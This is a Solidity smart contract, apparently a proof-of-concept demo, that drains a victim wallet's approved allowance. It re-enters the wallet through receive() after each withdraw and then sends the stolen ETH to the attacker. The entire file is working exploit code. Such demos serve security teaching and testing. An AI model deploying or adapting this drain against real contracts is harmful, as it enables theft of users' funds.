// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IVictimWallet {
    function allowances(address owner, address spender) external view returns (uint256);
    function spendFrom(address owner, uint256 amount) external;
    function withdraw(uint256 amount) external;
}

/**
 * @title AttackerContract - Exploits approval race condition
 * @notice Drains funds by exploiting the approval race condition vulnerability
 * @dev Uses reentrancy via receive() to recursively drain all approved funds
 */
contract AttackerContract {
    IVictimWallet public immutable WALLET;
    address public immutable VICTIM;
    address public immutable ATTACKER;

    uint256 public stolen;
    bool private draining;

    event AttackStarted(uint256 allowance);
    event Drained(uint256 amount);
    event AttackFinished(uint256 totalStolen);

    constructor(address _wallet, address _victim) {
        WALLET = IVictimWallet(_wallet);
        VICTIM = _victim;
        ATTACKER = msg.sender;
    }

    /**
     * @notice Execute the attack
     * @dev Starts the recursive draining process
     */
    function exploit() external {
        require(msg.sender == ATTACKER, "Not attacker");
        require(!draining, "Already draining");

        uint256 allowance = WALLET.allowances(VICTIM, address(this));
        require(allowance > 0, "No allowance");

        emit AttackStarted(allowance);

        draining = true;
        _drain();
        draining = false;

        emit AttackFinished(stolen);
    }

    /**
     * @notice Internal drain function
     */
    function _drain() private {
        uint256 allowance = WALLET.allowances(VICTIM, address(this));
        if (allowance == 0) return;

        // Drain in chunks of 5 ETH for demo purposes
        uint256 amount = allowance > 5 ether ? 5 ether : allowance;

        WALLET.spendFrom(VICTIM, amount);
        stolen += amount;
        emit Drained(amount);

        // Withdraw triggers receive() which continues the attack
        WALLET.withdraw(amount);
    }

    /**
     * @notice Reentrancy entry point - continues the attack
     * @dev Called when wallet.withdraw() sends ETH to this contract
     */
    receive() external payable {
        if (draining) {
            _drain();
        }
    }

    /**
     * @notice Attacker withdraws stolen funds
     */
    function withdrawStolen() external {
        require(msg.sender == ATTACKER, "Not attacker");
        (bool success,) = ATTACKER.call{ value: address(this).balance }("");
        require(success, "Transfer failed");
    }
}
